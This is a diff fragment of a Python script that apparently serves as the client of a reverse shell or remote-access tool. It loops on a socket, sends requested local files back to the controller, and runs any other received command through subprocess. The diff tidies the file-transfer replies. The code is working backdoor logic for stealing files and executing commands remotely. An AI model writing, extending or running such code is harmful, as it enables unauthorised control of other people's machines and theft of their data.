@@ -30,12 +30,15 @@ while True:
             output = ""
     elif splitted_command[0].lower() == 'read':
         file = splitted_command[1]
+        print(file)
         if os.path.exists(file) and os.path.isfile(file):
-            s.send("ok".encode())
+            s.send("ok".encode("utf-8"))
             with open(file, "rb") as f:
                 data = f.read()
             s.send(data)
-            s.send("file has been downloaded".encode())
+            s.send("end".encode("utf-8"))
+        else :
+            s.send("error".encode("utf-8"))
     else:
         output = subprocess.getoutput(command)
 
